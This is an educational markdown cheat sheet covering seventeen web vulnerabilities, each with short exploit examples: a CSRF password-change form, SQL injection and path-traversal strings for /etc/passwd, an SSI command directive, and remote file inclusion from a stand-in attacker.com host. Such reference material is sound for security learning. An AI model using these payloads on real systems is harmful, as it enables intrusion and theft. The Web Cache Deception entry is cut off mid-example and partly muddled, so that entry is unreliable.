# Vulnerability 

This markdown file provides an overview of common web vulnerabilities, including where to find them, how they can be exploited, and examples with HTTP headers if necessary.

---

## 1. CORS Misconfiguration

**Introduction:**    
CORS (Cross-Origin Resource Sharing) CORS is a browser security feature that controls how resources from one domain can be accessed by another, and misconfiguration can lead to security risks by allowing untrusted domains.  

**Where to Find:**  
Look for web applications that send or accept CORS headers like `Access-Control-Allow-Origin`. Misconfiguration can occur if:

- The header is set to `*` (allowing all domains) instead of specific trusted domains.
- The server accepts requests from untrusted or unnecessary domains.

**How to Exploit:**  
Attackers can exploit CORS misconfiguration by:

- Sending requests from a malicious website to steal sensitive data (like user info or session cookies).
- Performing actions on behalf of a logged-in user without their consent.

**Example:**

```
Request :

OPTIONS / HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 0
Origin: https://evil.com <--
Connection: close
Referer: https://evil.com
Priority: u=0
```

**A vulnerable server responds with this header:**    

```
 HTTP/1.1 200 OK
 server: nginx
 date: Thu, 30 Jan 2025 13:25:40 GMT
 content-type: application/json;charset=utf-8
 Content-Length: 2098
`access-control-allow-origin: https://www.evil.com <--
 access-control-expose-headers: X-BOT
 access-control-allow-methods: POST, GET, OPTIONS, DELETE, PUT
 access-control-allow-headers: X-ACK-RESPONSE,X-PARTNER-CONTEXT
 access-control-max-age: 2592000
 access-control-allow-credentials: true
``` 

---

## 2. CRLF Injection

**Introduction:**  
CRLF Injection involves injecting newline characters (Carriage Return and Line Feed) into web applications, manipulating HTTP headers or responses.

**Where to Find:**  
Web applications that use user input in HTTP headers (e.g., `Referer`, `User-Agent`).

**How to Exploit:**
1. Inject `\r\n` to split headers.
2. Add malicious headers like `Location` for redirect or `Set-Cookie`.

**Example:**
- **Inject:** `Referer: https://victim.com\r\nLocation: http://attacker.com`
- **Header:** `HTTP/1.1 200 OK\r\nSet-Cookie: malicious=true`

---

## 3. Cross-Site Request Forgery (CSRF)

**Introduction:**  
CSRF tricks the victim's browser into making unauthorized requests to a site where they are authenticated.

**Where to Find:**  
Forms or actions that perform state-changing operations (e.g., changing a password, submitting a form).

**How to Exploit:**
1. Create a malicious link or form that submits a request on behalf of the victim.
2. Send the link to the victim.

**Example:**
- **Malicious Form:**  
  ```html
  <form action="http://victim.com/change-password" method="POST">
    <input type="hidden" name="new-password" value="hacked123">
    <input type="submit" value="Submit">
  </form>

---

## 4. Arbitrary File Upload

**Introduction:**  
Arbitrary File Upload occurs when an application allows users to upload files without proper validation, potentially leading to malicious file execution or system compromise.

**Where to Find:**  
Applications that allow users to upload files (e.g., profile pictures, documents).

**How to Exploit:**
1. Upload a PHP shell or malicious script (e.g., `malicious.php`).
2. Access the uploaded file by navigating to its URL.

**Example:**
- **Upload:** Upload a file `malicious.php`.
- **Access:** `http://example.com/uploads/malicious.php`

---

## 5. Host Header Injection

**Introduction:**  
Host Header Injection occurs when an attacker manipulates the Host header to control server behavior (e.g., redirecting users or causing cache poisoning).

**Where to Find:**  
Web applications that use the Host header in routing or URL generation.

**How to Exploit:**

    Modify the Host header to an attacker-controlled domain.
    Induce a server to use this header in response generation.

**Example:**  

    Inject: Host: attacker.com
    Header: HTTP/1.1 200 OK\r\nHost: attacker.com

---   

## 6. Insecure Direct Object Reference (IDOR)

**Introduction:**  
IDOR occurs when an attacker can access or modify objects (e.g., files, database records) directly via manipulated input parameters.

**Where to Find:**  
URLs that include references to objects (e.g., user_id, file_id).

**How to Exploit:**  

    Modify the object reference to access unauthorized data.
    Example: Change user_id=1 to user_id=2 in the URL.

**Example:**  

    Inject: http://example.com/user?user_id=2
    Access: Data belonging to user_id=2.

---

## 7. Local File Inclusion (LFI)

**Introduction:**  
LFI occurs when a web application includes local files without proper validation, allowing attackers to read sensitive files or execute code.

**Where to Find:**  
Web applications that allow including files via user input (e.g., page or file parameters).

**How to Exploit:**  

    Manipulate the file parameter to include sensitive files (e.g., /etc/passwd).
    Gain insight into server files or execute code.

**Example:**

    Inject: file=../../../../etc/passwd
    Access: The contents of /etc/passwd.

---

## 8. NoSQL Injection

**Introduction:**
NoSQL Injection targets NoSQL databases, allowing attackers to manipulate queries and access or modify data.

**Where to Find:**
Web applications using NoSQL databases (e.g., MongoDB, CouchDB).

**How to Exploit:**

    Inject NoSQL query syntax into input fields.
    Retrieve or modify database content.

**Example:**  

    Inject: {"$ne": null}
    Result: Return all records where the field is not null.

---

## 9. OAuth Misconfiguration

**Introduction:**
OAuth Misconfiguration occurs when OAuth authentication or authorization is improperly configured, allowing unauthorized access to protected resources.

**Where to Find:**
OAuth-based login systems with improper scope or token validation.

**How to Exploit:**

    Misuse tokens to gain unauthorized access.
    Exploit incorrect scope assignments.

**Example:**  
    Inject: Modify OAuth token to gain access to unauthorized resources.
    Header: Authorization: Bearer [malicious_token]

---

## 10. Open Redirect


**Introduction:**
Open Redirect occurs when an attacker can redirect users to a malicious site by manipulating URL parameters.

**Where to Find:**
Applications that take user input and redirect to URLs.

**How to Exploit:**

    Craft a malicious URL that redirects users to a phishing site.
    Send the link to the victim.
**Example:**  

    Redirect: http://victim.com?redirect=https://attacker.com

---   

## 11. Reflected File Download (RFD)


**Introduction:**
RFD tricks users into downloading malicious files served by the application, disguised as safe files.

**Where to Find:**
Web applications that generate downloadable files based on user input.

**How to Exploit:**

    Manipulate input to serve a malicious file (e.g., exploit.exe).
    Trick users into downloading and running the file.

**Example:**  

    Inject: file=malicious.exe
    Result: The user downloads a malicious file.

---

## 12. Remote File Inclusion (RFI)


**Introduction:**
RFI allows attackers to include remote files, potentially leading to code execution or system compromise.

**Where to Find:**
Applications that allow file inclusion from external URLs.

**How to Exploit:**

    Modify the file parameter to point to an attacker-controlled file.
    Execute the remote file on the server.

**Example:**  

    Inject: file=http://attacker.com/malicious.php
    Result: Execute malicious code from a remote server.

---

## 13. SQL Injection

**Introduction:**
SQL Injection occurs when attackers inject malicious SQL code into input fields, allowing them to manipulate database queries.

**Where to Find:**
Forms or URLs that take user input and query a database.

**How to Exploit:**

    Inject SQL queries (e.g., ' OR 1=1 --).
    Extract or manipulate database data.
**Example:**  

    Inject: ' OR 1=1 --
    Result: Bypass authentication and access data.

---

## 14. Server Side Include Injection (SSI Injection)

**Introduction:**
SSI Injection involves injecting SSI directives into web pages, potentially leading to code execution or disclosure of sensitive data.

**Where to Find:**
Applications that process SSI directives, often via URLs or form inputs.

**How to Exploit:**

    Inject SSI directives to include sensitive files or execute commands.
    Gain information or control over the server.

**Example:**  

    Inject: <!--#exec cmd="id" -->
    Result: Execute server-side command and reveal system information.


---

## 15. Server Side Request Forgery (SSRF)


**Introduction:**
SSRF tricks the server into making requests to internal services, potentially leading to unauthorized access to internal resources.

**Where to Find:**
Web applications that make server-side HTTP requests based on user input.

**How to Exploit:**

    Manipulate input to make the server request internal resources (e.g., http://localhost).
    Access internal systems or perform attacks.

**Example:**  
    Inject: http://localhost:8000/admin
    Result: Access internal services or APIs.


---

## 16. Web Cache Deception

**Introduction:**
Web Cache Deception exploits caching mechanisms to serve malicious content to users.

**Where to Find:**
Applications that use caching and accept user-controlled input in URLs.

**How to Exploit:**

    Trick the caching mechanism into storing malicious content.
    Serve it to other users, bypassing security.
**Example:**  

    Inject: `http://example.com/page


## 17.Cross-site scripting (XSS) 

**Introduction:**  
XSS allows attackers to inject malicious scripts that run in a user's browser, potentially stealing data or manipulating the page.  

**Where to Find**:  
User input is displayed without sanitization (e.g., search bar, comment sections).    

**How to Exploit**:  
    Inject JavaScript into input fields that are reflected back.
    Execute the script in the victim’s browser.

**Example:**  

    Inject: <script>alert('XSS');</script>
    Result: JavaScript executes in the victim’s browser. 

---

